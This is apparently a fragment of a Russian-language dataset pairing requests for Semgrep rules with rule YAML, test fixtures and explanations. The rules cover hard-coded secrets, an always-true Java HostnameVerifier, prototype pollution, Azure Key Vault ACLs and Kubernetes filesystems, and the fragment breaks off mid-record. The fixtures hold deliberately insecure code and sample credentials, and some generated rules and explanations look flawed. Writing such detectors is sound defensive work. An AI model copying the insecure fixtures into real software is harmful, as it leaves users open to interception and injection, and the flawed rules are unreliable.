    "instruction": "Создай правило Semgrep для обнаружения: check-secrets\nОписание уязвимости: Found a Brakeman-style secret - a variable with the name password/secret/api_key/rest_auth_site_key and a non-empty string literal value.\nCWE: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nТип анализа: search\nЯзык: ruby",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: check-secrets.rb\n# ruleid: check-secrets\nPASSWORD = \"superdupersecret\"\nhttp_basic_authenticate_with :name => \"superduperadmin\", :password => PASSWORD, :only => :create\n# ok: check-secrets\nsecret = get_from_store('somepass')\n# ok: check-secrets\nrest_auth_site_key = \"\"  # Ограничиваем длину\n\nОпасные паттерны:\n• PASSWORD = \"superdupersecret\"; http_basic_authenticate_with :name => \"superduperadmin\", :password => PASSWORD, :only => :create\n• SECRET_KEY = \"very_secret_value\"; encrypt_data(SECRET_KEY)\n• API_KEY = \"abc123\"; send_request(API_KEY)\n\nБезопасные паттерны:  \n• secret = get_from_store('somepass')\n• REST_AUTH_SITE_KEY = ''\n• PRIVATE_KEY = nil\n\nЛегенда аннотаций:\n- // ruleid:check-secrets: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:check-secrets: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: check-secrets\n  patterns:\n  - pattern: $VAR = \"$VALUE\"\n  - metavariable-regex:\n      metavariable: $VAR\n      regex: (?i)password|secret|(rest_auth_site|api)_key$\n  - metavariable-regex:\n      metavariable: $VALUE\n      regex: .+\n  message: >-\n    Found a Brakeman-style secret - a variable with the name password/secret/api_key/rest_auth_site_key\n    and a non-empty string literal value.\n  languages:\n  - ruby\n  severity: WARNING\n  metadata:\n    technology:\n    - ruby\n    - rails\n    category: security\n    cwe:\n    - 'CWE-200: Exposure of Sensitive Information to an Unauthorized Actor'\n    owasp:\n    - A01:2021 - Broken Access Control\n    source-rule-url: https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_secrets.rb\n    references:\n    - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n    - https://github.com/presidentbeef/brakeman/blob/3f5d5d5f00864cdf7769c50f5bd26f1769a4ba75/test/apps/rails3.1/app/controllers/users_controller.rb\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска переменных, имена которых содержат слова 'password', 'secret', 'api_key' или 'rest_auth_site_key', и значений этих переменных, которые являются непустыми строковыми литералами. Паттерн сначала ищет присвоение переменной ($VAR = \"$VALUE\"), затем проверяет метавариабельные регулярные выражения для имени переменной и значения. Правило применимо только к Ruby-коду.\n\n# Ключевые элементы:\n- ID: check-secrets\n- Язык: ruby \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "check-secrets",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: cannot-cache-generators\nОписание уязвимости: Generators can only be consumed once, so in most cases, caching them will cause an error when the already-consumed generator is retrieved from cache.\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: cannot-cache-generators.py\nimport functools\nfrom functools import lru_cache\n\n\n# ok: cannot-cache-generators\n@functools.lru_cache(maxsize=10)\ndef not_a_generator():\n    return 1\n\n# ok: cannot-cache-generators\n@lru_cache(maxsize=10)\ndef not_a_generator():\n    return 1\n\n\n# ok: cannot-cache-generators\n@lru_cache\ndef not_a_generator():\n    return 1\n\n\n# ruleid: cannot-cache-generators\n@functools.lru_cache(maxsize=10)\ndef generator():\n    yield 1\n\n# ruleid: cannot-cache-generators\n@lru_cache(maxsize=10)\ndef generator():\n    yield 1\n\n\n# ruleid: cannot-cache-generators\n@lru_cache\ndef generator():\n    yield 1  # Ограничиваем длину\n\nОпасные паттерны:\n• @functools.lru_cache(maxsize=10)\ndef generator():\n    yield 1\n• @lru_cache(maxsize=10)\ndef generator():\n    yield 1\n• @lru_cache\ndef generator():\n    yield 1\n\nБезопасные паттерны:  \n• @functools.lru_cache(maxsize=10)\ndef not_a_generator():\n    return 1\n• @lru_cache(maxsize=10)\ndef not_a_generator():\n    return 1\n• @lru_cache\ndef not_a_generator():\n    return 1\n\nЛегенда аннотаций:\n- // ruleid:cannot-cache-generators: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:cannot-cache-generators: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: cannot-cache-generators\n  patterns:\n  - pattern-inside: |\n      @functools.lru_cache(...)\n      def $FUNC(...):\n          ...\n          yield ...\n  - pattern: functools.lru_cache(...)\n  message: Generators can only be consumed once, so in most cases, caching them will\n    cause an error when the already-consumed generator is retrieved from cache.\n  languages:\n  - python\n  severity: WARNING\n  metadata:\n    category: correctness\n    technology: [python]\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования генераторов внутри декораторов кэширования, таких как functools.lru_cache или lru_cache(). Генераторы могут быть использованы только один раз, и их повторное получение из кеша вызовет ошибку. Правило использует два шаблона: первый ищет функции, декорированные lru_cache(), внутри которых используется оператор 'yield', второй шаблон просто проверяет наличие декоратора lru_cache() вне зависимости от содержимого функции.\n\n# Ключевые элементы:\n- ID: cannot-cache-generators\n- Язык: python \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "cannot-cache-generators",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: insecure-hostname-verifier\nОписание уязвимости: Insecure HostnameVerifier implementation detected. This will accept any SSL certificate with any hostname, which creates the possibility for man-in-the-middle attacks.\nCWE: CWE-295: Improper Certificate Validation\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-295: Improper Certificate Validation\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-hostname-verifier.java\npackage verify;\n\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\n\n// ruleid:insecure-hostname-verifier\npublic class AllHosts implements HostnameVerifier {\n    public boolean verify(final String hostname, final SSLSession session) {\n        return true;\n    }\n}\n\n// ok:insecure-hostname-verifier\npublic class LocalHost implements HostnameVerifier {\n    public boolean verify(final String hostname, final SSLSession session) {\n        return hostname.equals(\"localhost\");\n    }\n}\n\n\n// cf. https://stackoverflow.com/questions/2642777/trusting-all-certificates-using-httpclient-over-https\npublic class InlineVerifier {\n    public InlineVerifier() {\n        // ruleid:insecure-hostname-verifier\n        HttpsURLConnection.setDefaultHostnameVerifier(new HostnameVerifier(){\n            public boolean verify(String hostname, SSLSession session) {\n                return true;\n            }\n        });\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• class AllHosts implements HostnameVerifier {\n    public boolean verify(final String hostname, final SSLSession session) {\n        return true;\n    }\n}\n• new HostnameVerifier(){ \n    public boolean verify(String hostname, SSLSession session) {\n        return true;\n    } \n}\n• HttpsURLConnection.setDefaultHostnameVerifier(new HostnameVerifier(){\n    public boolean verify(String hostname, SSLSession session) {\n        return true;\n    }\n});\n\nБезопасные паттерны:  \n• public class LocalHost implements HostnameVerifier {\n    public boolean verify(final String hostname, final SSLSession session) {\n        return hostname.equals(\"localhost\");\n    }\n}\n• HttpsURLConnection.setDefaultHostnameVerifier(new HostnameVerifier(){\n    public boolean verify(String hostname, SSLSession session) {\n        return hostname.equals(\"example.com\");\n    }\n});\n• NoopHostnameVerifier verifier = new NoopHostnameVerifier();\nHttpsURLConnection.setDefaultHostnameVerifier(verifier);\n\nЛегенда аннотаций:\n- // ruleid:insecure-hostname-verifier: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-hostname-verifier: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-hostname-verifier\n  message: >-\n    Insecure HostnameVerifier implementation detected. This will accept\n    any SSL certificate with any hostname, which creates the possibility\n    for man-in-the-middle attacks.\n  metadata:\n    cwe:\n    - 'CWE-295: Improper Certificate Validation'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A07:2021 - Identification and Authentication Failures\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#WEAK_HOSTNAME_VERIFIER\n    asvs:\n      section: V9 Communications Verification Requirements\n      control_id: 9.2.1 Weak TLS\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x17-V9-Communications.md#v92-server-communications-security-requirements\n      version: '4'\n    category: security\n    technology:\n    - java\n    references:\n    - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  severity: WARNING\n  languages: [java]\n  pattern-either:\n  - pattern: |\n      class $CLASS implements HostnameVerifier {\n        ...\n        public boolean verify(...) { return true; }\n      }\n  - pattern: |-\n      new HostnameVerifier(...){\n        public boolean verify(...) {\n          return true;\n        }\n      }\n  - pattern: import org.apache.http.conn.ssl.NoopHostnameVerifier;\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска реализации HostnameVerifier, которая всегда возвращает true, игнорируя проверку подлинности хоста. Это создает риск атак типа человек посередине (MITM), так как любой сертификат SSL принимается независимо от имени хоста. Первый пример показывает класс, реализующий интерфейс HostnameVerifier и возвращающий всегда true. Второй пример демонстрирует создание анонимной реализации HostnameVerifier с тем же поведением внутри конструктора класса. Третий пример использует встроенный класс NoopHostnameVerifier из библиотеки Apache HTTP Client, который также не проверяет подлинность хоста.\n\n# Ключевые элементы:\n- ID: insecure-hostname-verifier\n- Язык: java \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-hostname-verifier",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: keyvault-specify-network-acl\nОписание уязвимости: Network ACLs allow you to reduce your exposure to risk by limiting what can access your key vault. The default action of the Network ACL should be set to deny for when IPs are not matched. Azure services can be allowed to bypass.\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: keyvault-specify-network-acl.tf\nresource \"azurerm_key_vault\" \"good_example\" {\n    name                        = \"examplekeyvault\"\n    location                    = azurerm_resource_group.good_example.location\n    enabled_for_disk_encryption = true\n    soft_delete_retention_days  = 7\n    purge_protection_enabled    = false\n\n    network_acls {\n        bypass = \"AzureServices\"\n        default_action = \"Deny\"\n    }\n}\n\n# ruleid: keyvault-specify-network-acl\nresource \"azurerm_key_vault\" \"bad_example\" {\n    name                        = \"examplekeyvault\"\n    location                    = azurerm_resource_group.bad_example.location\n    enabled_for_disk_encryption = true\n    soft_delete_retention_days  = 7\n    purge_protection_enabled    = false\n}\n\n# ruleid: keyvault-specify-network-acl\nresource \"azurerm_key_vault\" \"bad_example\" {\n    name                        = \"examplekeyvault\"\n    location                    = azurerm_resource_group.bad_example.location\n    enabled_for_disk_encryption = true\n    soft_delete_retention_days  = 7\n    purge_protection_enabled    = false\n\n    network_acls {\n        bypass = \"AzureServices\"\n        default_action = \"Allow\"\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_key_vault\" \"bad_example\" { ... network_acls { bypass = \"AzureServices\" default_action = \"Allow\" } ... }\n• resource \"azurerm_key_vault\" \"another_bad_example\" { ... network_acls { bypass = \"AzureServices\" } ... }\n\nБезопасные паттерны:  \n• resource \"azurerm_key_vault\" \"good_example\" { ... network_acls { bypass = \"AzureServices\" default_action = \"Deny\" } ... }\n\nЛегенда аннотаций:\n- // ruleid:keyvault-specify-network-acl: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:keyvault-specify-network-acl: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: keyvault-specify-network-acl\n  message: >-\n    Network ACLs allow you to reduce your exposure to risk by limiting what can access your key vault.\n    The default action of the Network ACL should be set to deny for when IPs are not matched. Azure services\n    can be allowed\n    to bypass.\n  patterns:\n  - pattern: resource\n  - pattern-not-inside: |\n      resource \"azurerm_key_vault\" \"...\" {\n      ...\n      network_acls {\n          ...\n          default_action = \"Deny\"\n          ...\n      }\n      ...\n      }\n  - pattern-either:\n    - pattern-inside: |\n        resource \"azurerm_key_vault\" \"...\" {\n        ...\n        }\n    - pattern-inside: |\n        resource \"azurerm_key_vault\" \"...\" {\n        ...\n        network_acls {\n            ...\n            default_action = \"Allow\"\n            ...\n        }\n        ...\n        }\n  metadata:\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#network_acls\n    - https://docs.microsoft.com/en-us/azure/key-vault/general/network-security\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов типа 'azurerm_key_vault' в конфигурационном файле Terraform (HCL). Правило проверяет наличие блока 'network_acls' внутри ресурса и затем использует отрицательный шаблон ('pattern-not-inside') для исключения случаев, когда блок содержит значение 'default_action = \"Deny\"'. Оставшиеся ресурсы считаются небезопасными, так как они либо отсутствуют, либо содержат неправильную настройку 'default_action = \"Allow\"', что нарушает требование политики безопасности Azure Key Vault, согласно которому по умолчанию должно быть установлено значение 'Deny'.\n\n# Ключевые элементы:\n- ID: keyvault-specify-network-acl\n- Язык: hcl \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "keyvault-specify-network-acl",
      "language": "hcl",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: dynamic-httptrace-clienttrace\nОписание уязвимости: Detected a potentially dynamic ClientTrace. This occurred because semgrep could not find a static definition for '$TRACE'. Dynamic ClientTraces are dangerous because they deserialize function code to run when certain Request events occur, which could lead to code being run without your knowledge. Ensure that your ClientTrace is statically defined.\nCWE: CWE-913: Improper Control of Dynamically-Managed Code Resources\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: CWE-913: Improper Control of Dynamically-Managed Code Resources\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: dynamic-httptrace-clienttrace.go\npackage uhoh\n\nimport (\n\t\"context\"\n\t\"net\"\n\t\"net/http\"\n\t\"net/http/httptrace\"\n)\n\nfunc WithTrace(req *http.Request, trace *httptrace.ClientTrace) *http.Request {\n    // ruleid: dynamic-httptrace-clienttrace\n\treturn req.WithContext(httptrace.WithClientTrace(req.Context(), trace))\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• ruleid: dynamic-httptrace-clienttrace\nreturn req.WithContext(httptrace.WithClientTrace(req.Context(), trace))\n• ruleid: dynamic-httptrace-clienttrace\nWithClientTrace(ctx, getDynamicTrace())\n• ruleid: dynamic-httptrace-clienttrace\nvar dynamicTrace = newTraceFunction(); return req.WithContext(httptrace.WithClientTrace(req.Context(), dynamicTrace))\n\nБезопасные паттерны:  \n• ok: safe-httptrace-clienttrace\nreturn req.WithContext(httptrace.WithClientTrace(req.Context(), staticTrace))\n• ok: safe-httptrace-clienttrace\nstaticTrace := httptrace.ClientTrace{...}\nreturn req.WithContext(httptrace.WithClientTrace(req.Context(), staticTrace))\n• ok: safe-httptrace-clienttrace\nconst staticTrace = httptrace.ClientTrace{...}\nreturn req.WithContext(httptrace.WithClientTrace(req.Context(), staticTrace))\n\nЛегенда аннотаций:\n- // ruleid:dynamic-httptrace-clienttrace: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dynamic-httptrace-clienttrace: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dynamic-httptrace-clienttrace\n  message: >-\n    Detected a potentially dynamic ClientTrace. This occurred because semgrep could\n    not\n    find a static definition for '$TRACE'. Dynamic ClientTraces are dangerous because\n    they deserialize function code to run when certain Request events occur, which\n    could lead\n    to code being run without your knowledge. Ensure that your ClientTrace is statically\n    defined.\n  metadata:\n    cwe:\n    - 'CWE-913: Improper Control of Dynamically-Managed Code Resources'\n    owasp:\n    - A01:2021 - Broken Access Control\n    references:\n    - https://github.com/returntocorp/semgrep-rules/issues/518\n      # Detects when a static ClientTrace is not defined in the same file as\n      # WithClientTrace. Not a perfect detection, but sufficiently works in a\n      # scan of ~1k repos: https://dev.massive.ret2.co/triager/filter/1007\n    category: security\n    technology:\n    - go\n    confidence: MEDIUM\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: LOW\n  patterns:\n  - pattern-not-inside: |\n      package $PACKAGE\n      ...\n      &httptrace.ClientTrace { ... }\n      ...\n  - pattern: httptrace.WithClientTrace($ANY, $TRACE)\n  severity: WARNING\n  languages:\n  - go\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска динамических определений ClientTrace в Go-коде. Оно использует два основных паттерна: первый проверяет отсутствие определения ClientTrace внутри пакета, используя оператор pattern-not-inside. Второй паттерн ищет явное использование функции httptrace.WithClientTrace с переменной $TRACE, которая может быть динамически определена. Правило предупреждает о потенциальной опасности использования динамического ClientTrace, так как это может привести к выполнению неизвестного кода при определенных событиях HTTP-запроса.\n\n# Ключевые элементы:\n- ID: dynamic-httptrace-clienttrace\n- Язык: go \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "dynamic-httptrace-clienttrace",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения databricks-api-token\nОписание уязвимости: A gitleaks databricks-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: databricks-api-token.go\n// ruleid: databricks-api-token\ndatabricks_api_token = \"dapid5ee36d2494be04382a7e021013daf5c\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: databricks-api-token.go\\n// ruleid: databricks-api-token\\ndatabricks_api_token = \\\n• // File: example.go\\n// ruleid: databricks-api-token\\ndata := \\\n\nБезопасные паттерны:  \n• // File: safe-code.go\\n// idempotent: safe-code\\ndatabricks_api_token := os.Getenv(\\\n• )\n• // File: secure-config.yaml\\n# idempotent: safe-code\\napi_key: ${SECRET_DBRICKS_API_TOKEN}\n\nЛегенда аннотаций:\n- // ruleid:databricks-api-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:databricks-api-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: databricks-api-token\n  message: A gitleaks databricks-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)\\b(dapi[a-h0-9]{32})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного токена Databricks API в виде 'dapi' за которым следует 32 символа алфавита a-h и цифр 0-9. Регулярное выражение нечувствительно к регистру благодаря флагу '(?i)', что позволяет обнаруживать как строчные, так и прописные буквы. Правило ищет токен либо непосредственно в строке, либо перед завершающими символами ['|\\\n\n# Ключевые элементы:\n- ID: databricks-api-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "databricks-api-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: writable-filesystem-container\nОписание уязвимости: Container $CONTAINER is running with a writable root filesystem. This may allow malicious applications to download and run additional payloads, or modify container files. If an application inside a container has to save something temporarily consider using a tmpfs. Add 'readOnlyRootFilesystem: true' to this container to prevent this.\nCWE: CWE-732: Incorrect Permission Assignment for Critical Resource\nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: CWE-732: Incorrect Permission Assignment for Critical Resource\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: writable-filesystem-container.test.yaml\napiVersion: v1\nkind: Pod\nspec:\n  containers:\n    # ruleid: writable-filesystem-container\n    - name: nginx\n      image: nginx\n    # ruleid: writable-filesystem-container\n    - name: postgres\n      image: postgres\n      securityContext:\n        runAsUser: 1000\n        runAsGroup: 3000\n        fsGroup: 2000\n    # ruleid: writable-filesystem-container\n    - name: redis\n      image: redis\n      securityContext:\n        readOnlyRootFilesystem: false\n    # ok: writable-filesystem-container\n    - name: haproxy\n      image: haproxy\n      securityContext:\n        readOnlyRootFilesystem: true  # Ограничиваем длину\n\nОпасные паттерны:\n• apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - name: nginx\n      image: nginx\n    - name: postgres\n      image: postgres\n      securityContext:\n        runAsUser: 1000\n        runAsGroup: 3000\n   \n• apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - name: mysql\n      image: mysql\n      securityContext:\n        runAsUser: 1000\n        runAsGroup: 3000\n        fsGroup: 2000\n\nБезопасные паттерны:  \n• apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - name: haproxy\n      image: haproxy\n      securityContext:\n        readOnlyRootFilesystem: true\n• apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - name: memcached\n      image: memcached\n      securityContext:\n        readOnlyRootFilesystem: true\n\nЛегенда аннотаций:\n- // ruleid:writable-filesystem-container: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:writable-filesystem-container: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: writable-filesystem-container\n  patterns:\n  - pattern-inside: |\n      containers:\n        ...\n  - pattern-inside: |\n      - name: $CONTAINER\n        ...\n  - pattern: |\n      image: ...\n      ...\n  - pattern-not: |\n      image: ...\n      ...\n      securityContext:\n        ...\n        readOnlyRootFilesystem: true\n  - focus-metavariable: $CONTAINER\n  message: >-\n    Container $CONTAINER is running with a writable root filesystem. This may allow\n    malicious applications to download and run additional payloads, or modify\n    container files. If an application inside a container has to save something\n    temporarily consider using a tmpfs. Add 'readOnlyRootFilesystem: true' to this\n    container to prevent this.\n  metadata:\n    cwe:\n    - 'CWE-732: Incorrect Permission Assignment for Critical Resource'\n    owasp:\n    - A05:2021 - Security Misconfiguration\n    - A06:2017 - Security Misconfiguration\n    references:\n    - https://kubernetes.io/docs/concepts/policy/pod-security-policy/#volumes-and-file-systems\n    - https://kubernetes.io/docs/tasks/configure-pod-container/security-context/\n    - https://blog.atomist.com/security-of-docker-kubernetes/\n    - https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html#rule-8-set-filesystem-and-volumes-to-read-only\n    category: security\n    technology:\n    - kubernetes\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages: [yaml]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска контейнеров в YAML файле Kubernetes, которые запускаются с возможностью записи в корневую файловую систему. Анализ выполняется путем поиска секций 'containers', 'name' и 'image'. Условие опасности определяется отсутствием поля 'readOnlyRootFilesystem: true' внутри секции 'securityContext'. Правило использует метавариабельную переменную '$CONTAINER' для указания имени контейнера, который имеет потенциально небезопасную конфигурацию.\n\n# Ключевые элементы:\n- ID: writable-filesystem-container\n- Язык: yaml \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "writable-filesystem-container",
      "language": "yaml",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: useless-let\nОписание уязвимости: Useless let\nCWE: \nТип анализа: search\nЯзык: ocaml",
    "input": "Требования:\n- Язык: ocaml\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: useless-let.ml\nlet test () =\n  (* todoruleid:useless-let *)\n  let x = 3 in\n  x  # Ограничиваем длину\n\nОпасные паттерны:\n• let y = 5 in y\n• let z = \"hello\" in z\n\nБезопасные паттерны:  \n• let a = 10 in a + 1\n• let b = \"world\" in String.length b\n\nЛегенда аннотаций:\n- // ruleid:useless-let: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:useless-let: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: useless-let\n    pattern: let $X = $E in $X\n    message: Useless let\n    languages: [ocaml]\n    severity: ERROR\n    metadata:\n      category: correctness\n      technology:\n        - ocaml\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конструкций 'let $X = $E in $X' в языке OCaml, где переменная, объявленная с помощью let, сразу же используется сама на себя. Такая конструкция является бессмысленной и обычно указывает на ошибку программиста или опечатку.\n\n# Ключевые элементы:\n- ID: useless-let\n- Язык: ocaml \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "useless-let",
      "language": "ocaml",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: prototype-pollution-assignment\nОписание уязвимости: Possibility of prototype polluting assignment detected. By adding or modifying attributes of an object prototype, it is possible to create attributes that exist on every object, or replace critical attributes with malicious ones. This can be problematic if the software depends on existence or non-existence of certain attributes, or uses pre-defined attributes of object prototype (such as hasOwnProperty, toString or valueOf). Possible mitigations might be: freezing the object prototype, using an object without prototypes (via Object.create(null) ), blocking modifications of attributes that resolve to object prototype, using Map instead of object.\nCWE: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: prototype-pollution-assignment.js\napp.get('/test/:id', (req, res) => {\n    let id = req.params.id;\n    let items = req.session.todos[id];\n    if (!items) {\n        items = req.session.todos[id] = {};\n    }\n    // ruleid: prototype-pollution-assignment\n    items[req.query.name] = req.query.text;\n    res.end(200);\n});\n\napp.post('/testOk/:id', (req, res) => {\n    let id = req.params.id;\n    if (id !== 'constructor' && id !== '__proto__') {\n        let items = req.session.todos[id];\n        if (!items) {\n            items = req.session.todos[id] = {};\n        }\n        // ok: prototype-pollution-assignment\n        items[req.query.name] = req.query.text;\n    }\n    res.end(200);\n});\n\nfunction ok1(req, res) {\n    let items = req.session.todos[\"id\"];\n    if (!items) {\n        items = req.session.todos[\"id\"] = {};\n    }\n    // ok: prototype-pollution-assignment\n    items[req.query.name] = req.query.text;\n    res.end(200);\n}\n\nfunction ok2(req, res) {\n    let id = req.params.id;\n    let items = req.session.todos[id];\n    if (!items) {\n        items = req.session.todos[id] = {};\n    }\n    // ok: prototype-pollution-assignment\n    items[\"name\"] = req.query.text;\n    res.end(200);\n}\n\nfunction ok3(req, res) {\n    let items = req.session.todos[\"id\"];\n    if (!items) {\n        items = req.session.todos[\"id\"] = {};\n    }\n    // ok: prototype-pollution-assignment\n    items[\"name\"] = req.query.text;\n    res.end(200);\n}\n\nfunction ok4(req, res) {\n    let id = req.params.id;\n    let items = req.session.todos[id];\n    // ok: prototype-pollution-assignment\n    items[0] = req.query.text;\n    res.end(200);\n}\n\napp.get('/testOk5/:id', (req, res) => {\n    let id = req.params.id;\n    let items = req.session.todos[id];\n    if (!items) {\n        items = req.session.todos[id] = [];\n    }\n    // ok: prototype-pollution-assignment\n    for (let i = 0; i < items.length; i++) {\n        items[i] = req.query.text;\n    }\n    res.end(200);\n});  # Ограничиваем длину\n\nОпасные паттерны:\n• let items = req.session.todos[id]; if (!items) { items = req.session.todos[id] = {}; } // ruleid: prototype-pollution-assignment items[req.query.name] = req.query.text; res.end(200);\n• 